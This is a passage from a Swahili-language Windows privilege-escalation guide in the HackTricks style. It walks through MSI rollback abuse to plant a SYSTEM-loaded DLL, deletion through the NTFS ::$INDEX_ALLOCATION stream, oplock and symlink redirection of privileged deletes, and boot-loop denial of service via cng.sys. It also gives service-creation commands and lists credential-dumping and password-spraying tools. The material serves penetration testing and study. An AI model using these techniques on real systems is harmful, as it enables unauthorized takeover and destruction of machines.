- Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya itakapotokea.
- Hifadhi filename yake.

- Hatua ya 9: Sync Kabla ya Rollback
- `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
- Hutuma event wakati `.rbs` inapoundwa.
- Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena Weak ACL
- Baada ya kupokea event ya `.rbs created`:
- Windows Installer **huweka tena strong ACLs** kwenye `C:\Config.Msi`.
- Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena weak ACLs**.

> ACLs **hutekelezwa tu wakati wa kufungua handle**, kwa hiyo bado unaweza kuandika kwenye folder.

- Hatua ya 11: Weka Fake `.rbs` na `.rbf`
- Overwrite file la `.rbs` kwa **fake rollback script** linaloiambia Windows:
- Irejeshe file lako la `.rbf` (malicious DLL) katika **privileged location** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Weka fake `.rbf` yako iliyo na **malicious SYSTEM-level payload DLL**.

- Hatua ya 12: Trigger Rollback
- Tuma signal kwenye sync event ili installer iendelee.
- **Type 19 custom action (`ErrorOut`)** imesanidiwa **kufanya install ishindwe kimakusudi** katika sehemu inayojulikana.
- Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Inasakinisha DLL Yako
- Windows Installer:
- Husoma `.rbs` yako hasidi.
- Hunakili `.rbf` DLL yako hadi kwenye target location.
- Sasa una **malicious DLL yako katika SYSTEM-loaded path**.

- Hatua ya Mwisho: Tekeleza SYSTEM Code
- Endesha **auto-elevated binary** inayoaminika (kwa mfano, `osk.exe`) inayopakia DLL uliyo-hijack.
- **Boom**: Code yako inatekelezwa **kama SYSTEM**.


### Kutoka Kufuta/Kuhamisha/Kubadilisha Jina kwa File Zisizo za Kawaida hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyotangulia) inadhania kuwa unaweza kufuta **folder zima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa vulnerability yako inaruhusu tu **arbitrary file deletion**?

Unaweza kutumia vibaya **NTFS internals**: kila folder lina alternate data stream iliyofichwa inayoitwa:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Stream hii huhifadhi **metadata ya index** ya folda.

Kwa hivyo, ukifuta **stream ya `::$INDEX_ALLOCATION`** ya folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivyo kwa kutumia API za kawaida za kufuta faili kama vile:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Itakuwaje ikiwa primitive yako haikuruhusu kufuta files/folders za kiholela, lakini **inaruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na attacker**?

1. Hatua ya 1: Weka bait folder na file
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husimamisha utekelezaji** wakati process yenye privileges inapojaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua ya 3: Anzisha process ya SYSTEM (k.m. `SilentCleanup`)
- Process hii huchanganua folda (k.m. `%TEMP%`) na kujaribu kufuta yaliyomo.
- Inapofikia `file1.txt`, **oplock hu-trigger** na kumpa udhibiti callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
- Hii huacha `folder1` tupu bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — kufanya hivyo kungeachilia oplock mapema.

- Chaguo B: Geuza `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga NTFS internal stream inayohifadhi folder metadata — kuifuta kunafuta folder.

5. Step 5: Release the oplock
- SYSTEM process inaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Uundaji wa Folder ya Kiholela hadi DoS ya Kudumu

Tumia primitive inayokuruhusu **kuunda folder ya kiholela kama SYSTEM/admin** — hata kama **huwezi kuandika files** au **kuweka permissions dhaifu**.

Unda **folder** (si file) yenye jina la **Windows driver muhimu**, kwa mfano:
```
C:\Windows\System32\cng.sys
```
- Njia hii kwa kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ikiwa **utaianzisha mapema kama folder**, Windows hushindwa kupakia driver halisi wakati wa kuwasha.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
- Huona folder hiyo, **hushindwa kutatua driver halisi**, na **hu-crash au husitisha kuwasha**.
- **Hakuna fallback**, wala **recovery** bila intervention ya nje (kwa mfano, boot repair au disk access).

### Kutoka kwenye privileged log/backup paths + OM symlinks hadi arbitrary file overwrite / boot DoS

Wakati **privileged service** huandika logs/exports kwenye path inayosomwa kutoka kwenye **writable config**, elekeza path hiyo kwa kutumia **Object Manager symlinks + NTFS mount points** ili kubadilisha privileged write kuwa arbitrary overwrite (hata **bila SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi target path iwe writable na attacker (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kuelekea `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privileged operation inayoandika kwenye path hiyo (log, export, report).

**Mfano wa mfululizo**
1. Soma config ili kupata privileged log destination, kwa mfano `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` ndani ya `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza path hiyo bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye privileges iandike log (kwa mfano, admin anachochea "send test SMS"). Sasa uandishi unaishia kwenye `C:\Windows\System32\cng.sys`.
4. Kagua target iliyoandikwa juu yake (hex/PE parser) ili kuthibitisha corruption; kuwasha upya kunalazimisha Windows kupakia driver path iliyochezewa → **boot loop DoS**. Hii pia inatumika kwa faili yoyote iliyolindwa ambayo service yenye privileges itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo katika `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, hivyo kuifanya kuwa sink ya kuaminika ya DoS kwa data iliyoharibika.



## **Kutoka High Integrity hadi System**

### **Service mpya**

Ikiwa tayari unaendesha process ya High Integrity, **path to SYSTEM** inaweza kuwa rahisi kwa **kuunda na kutekeleza service mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Unapounda service binary hakikisha ni service halali au binary inatekeleza vitendo vinavyohitajika kwa haraka, kwa kuwa itauawa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwezesha AlwaysInstallElevated registry entries** na **kuinstall** reverse shell ukitumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kuinstall package ya _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una token privileges hizo (huenda utazipata kwenye mchakato ambao tayari ni wa High Integrity), utaweza **kufungua karibu mchakato wowote** (isipokuwa protected processes) kwa kutumia SeDebug privilege, **kunakili token** ya mchakato huo, na kuunda **mchakato wa kiholela wenye token hiyo**.\
Kwa kawaida, ukitumia technique hii **utachagua mchakato wowote unaoendesha kama SYSTEM wenye token privileges zote** (_ndiyo, unaweza kupata SYSTEM processes zisizo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza technique iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Technique hii inatumiwa na meterpreter kufanya privilege escalation kwenye `getsystem`. Technique hii inahusisha **kuunda pipe na kisha kuunda/kutumia service kuandika kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia **`SeImpersonate`** privilege itaweza **kuimpersonate token** ya pipe client (service), na kupata SYSTEM privileges.\
Ikiwa ungependa [**kujifunza zaidi kuhusu name pipes, unapaswa kusoma hii**](#named-pipe-client-impersonation).\
Ikiwa ungependa kusoma mfano wa [**jinsi ya kutoka high integrity hadi System kwa kutumia name pipes, unapaswa kusoma hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukiweza **kuhijack dll** inayokuwa **loaded** na **process** unaoendesha kama **SYSTEM**, utaweza kutekeleza arbitrary code kwa permissions hizo. Kwa hiyo Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na, zaidi ya hayo, ni **rahisi zaidi kuitekeleza kutoka kwenye mchakato wa high integrity** kwa kuwa utakuwa na **write permissions** kwenye folders zinazotumika kuload dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Tool bora ya kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na sensitive files (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imedetectiwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za saved sessions za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwenye local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imedetectiwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hunyunyiza passwords zilizokusanywa kwenye domain nzima**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS spoofer na man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta known privesc vulnerabilities (DEPRECATED kwa Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Hukagua local **(Inahitaji Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta known privesc vulnerabilities (inahitajika kucompile kwa kutumia VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Huenumerate host kutafuta misconfigurations (ni zaidi ya gather info tool kuliko privesc) (inahitajika kucompile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (precompiled exe kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable precompiled kwenye github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka Python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool iliyoundwa kulingana na post hii (haihitaji accesschk kufanya kazi vizuri, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma output ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma output ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Lazima ucompile project ukitumia toleo sahihi la .NET ([**angalia hii**](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililoinstall kwenye victim host unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kuongeza privileges kwa kutumia udhaifu wa ruhusa za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha ya ukaguzi ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing ya Word VBA macro kupitia SMTP → usimbuaji wa credential wa hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak ya format-string + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na Panya katika Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Udhaifu wa Privileged File System unaopatikana katika SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Zana za Kujaribu Symbolic Link – Matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia Vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Module Resolution hatari kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - changamoto za C/C++ checklist, zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - function ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: Kuunganisha CLDFLT na DirectX Kernel Race Conditions kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: Exploit Primitive kamili ya Read/Write kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia Vibaya Arbitrary File Deletes ili Kuongeza Privilege na Ujanja Mwingine Mzuri](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Sehemu ya 2: CVE-2020-1013, Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Mabadiliko ya Image Yanaposababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa Ssh Private Keys kutoka Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)

{{#include ../../banners/hacktricks-training.md}}
